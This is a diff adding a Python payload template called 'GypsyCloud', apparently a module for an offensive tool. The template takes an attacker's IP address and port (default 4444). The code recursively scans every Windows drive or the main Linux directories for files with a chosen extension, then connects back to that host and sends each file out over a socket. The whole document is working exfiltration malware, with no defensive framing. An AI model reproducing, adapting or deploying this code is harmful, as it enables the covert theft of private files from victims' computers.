@@ -1,0 +1,96 @@
+#!name##GypsyCloud
+#!types##payload
+#!info##Payload created in python. It searches directories for files with a specific extension. Sends the found files to the server.
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##GC_port##Host port##int
+#!setVar##GC_port##4444##int
+#!reqVar##GC_fext##File exitension to grab. Ex. jpg, jpeg, txt etc.##str
+#!setVar##GC_fext##jpg##str
+#!reqVar##GC_target##Target system. Ex. windows or linux##str
+#!setVar##GC_target##windows##str
+#!import_FLAG##True
+#!render_FLAG##True
+
+
+
+import socket
+import os
+from threading import Thread, Lock
+from time import sleep
+
+
+
+class GypsyCloud:
+    def __init__(self):
+        self.name = "GypsyCloud"
+        self.addr = ("{{IP_ADDR}}", {{GC_port}})
+        self.targets = set()
+        self.fext = f".{'{{GC_fext}}'.lstrip('.')}"
+        self.system = "{{GC_target}}"
+        self.lock = Lock()
+
+    def connect(self) -> bool:
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect(self.addr)
+            return True
+        except:
+            return False
+
+    def linux_dirs(self) -> list:
+        return ["/home", "/", "~"]
+    
+    def windows_dirs(self) -> list:
+        disk = "cdefghijk"
+        dirs = []
+        for d in disk:
+            try:
+                os.chdir(f"{d}:/")
+                dirs.append(f"{d}:/")
+            except:
+                continue
+        return dirs
+    
+    def _scouting(self, parts: list, root_dir: str) -> None:
+        for file in parts:
+            if os.path.splitext(file)[1] == self.fext:
+                with self.lock:
+                    self.targets.add(os.path.join(root_dir, file))
+                
+    
+    def scouting(self, base_dir: str) -> None:
+        for root, dirs, files in os.walk(base_dir):
+            gypsy = Thread(target=self._scouting, args=(files, root))
+            gypsy.start()
+    
+    def send(self, fpath: str) -> None:
+        try:
+            with open(fpath, "rb") as f:
+                self.client.sendfile(f, 0)
+        except:
+            pass
+    
+    def sending(self) -> None:
+        while True:
+            if self.connect():
+                break
+            sleep(3)
+
+        for tar in self.targets:
+            self.send(tar)
+            sleep(2)
+
+    def work(self) -> None:
+        if self.system == "linux":
+            bdir = self.linux_dirs()
+        else:
+            bdir = self.windows_dirs()
+        for b in bdir:
+            self.scouting(b)
+        self.sending()
+    
+    def run(self) -> None:
+        self.work()
+
+gc = GypsyCloud()
+gc.run()
